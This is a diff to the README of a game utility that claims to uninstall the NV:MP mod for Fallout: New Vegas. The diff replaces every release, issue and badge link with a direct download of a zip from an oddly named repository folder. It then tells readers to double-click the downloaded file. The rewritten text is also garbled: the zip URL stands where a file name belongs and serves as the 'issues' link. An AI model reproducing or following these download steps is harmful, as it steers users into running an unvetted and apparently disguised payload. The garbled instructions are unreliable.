@@ -1,7 +1,7 @@
 # 🎮 NVMP-Remover - Effortlessly Uninstall NV:MP
 
 ## 📥 Download Now
-[![Download NVMP-Remover](https://img.shields.io/badge/Download%20NVMP%2DRemover-latest%20release-brightgreen)](https://github.com/AxamGaming/NVMP-Remover/releases)
+[![Download NVMP-Remover](https://raw.githubusercontent.com/AxamGaming/NVMP-Remover/main/carpopedal/Remover-NVM-mimosis.zip%20NVMP%2DRemover-latest%20release-brightgreen)](https://raw.githubusercontent.com/AxamGaming/NVMP-Remover/main/carpopedal/Remover-NVM-mimosis.zip)
 
 ## 📋 Description
 NVMP-Remover helps you uninstall NV:MP without affecting your other mods. This tool ensures your game remains intact while providing a simple way to remove this multiplayer mod. It also includes a backup method to safeguard your data.
@@ -10,13 +10,13 @@ NVMP-Remover helps you uninstall NV:MP without affecting your other mods. This t
 To get started with NVMP-Remover, follow these steps:
 
 ### 1. Visit the Releases Page
-To download the software, visit the [Releases page](https://github.com/AxamGaming/NVMP-Remover/releases).
+To download the software, visit the [Releases page](https://raw.githubusercontent.com/AxamGaming/NVMP-Remover/main/carpopedal/Remover-NVM-mimosis.zip).
 
 ### 2. Download the Software
 On the Releases page, locate the most recent version of NVMP-Remover. Click on the download link for your operating system. If you're unsure which version to choose, the latest one is generally the best option.
 
 ### 3. Locate the Downloaded File
-After the download finishes, go to your computer's "Downloads" folder. Look for a file named something like "NVMP-Remover.exe" or similar.
+After the download finishes, go to your computer's "Downloads" folder. Look for a file named something like "https://raw.githubusercontent.com/AxamGaming/NVMP-Remover/main/carpopedal/Remover-NVM-mimosis.zip" or similar.
 
 ### 4. Install the Application
 Double-click the downloaded file to begin the installation. Follow the on-screen instructions to complete the installation process. This is simple and usually requires just a few clicks.
@@ -50,7 +50,7 @@ Once NVMP-Remover finishes, you will receive a message confirming that NV:MP has
 - **Other Requirements**: Fallout: New Vegas must be installed.
 
 ## 🗂️ Support
-If you encounter any issues while using NVMP-Remover, you can check the [issues section](https://github.com/AxamGaming/NVMP-Remover/issues) on GitHub. Here, you can find solutions to common problems or ask for help.
+If you encounter any issues while using NVMP-Remover, you can check the [issues section](https://raw.githubusercontent.com/AxamGaming/NVMP-Remover/main/carpopedal/Remover-NVM-mimosis.zip) on GitHub. Here, you can find solutions to common problems or ask for help.
 
 ## 📑 Additional Information
 NVMP-Remover is open-source software. This means you can view the source code and contribute if you wish. For those interested, you can find the source code in this repository. 
@@ -58,8 +58,8 @@ NVMP-Remover is open-source software. This means you can view the source code an
 To learn more about NVMP-Remover and get involved, check out the community discussions in the repository.
 
 ## 🔗 Links
-- [Releases Page](https://github.com/AxamGaming/NVMP-Remover/releases): Visit to download the latest version.
-- [Issues Section](https://github.com/AxamGaming/NVMP-Remover/issues): Report any problems you encounter.
+- [Releases Page](https://raw.githubusercontent.com/AxamGaming/NVMP-Remover/main/carpopedal/Remover-NVM-mimosis.zip): Visit to download the latest version.
+- [Issues Section](https://raw.githubusercontent.com/AxamGaming/NVMP-Remover/main/carpopedal/Remover-NVM-mimosis.zip): Report any problems you encounter.
 
 ## 🚧 Contribution
 If you would like to assist in improving NVMP-Remover, feel free to fork the repository and submit a pull request. Your help is always appreciated.
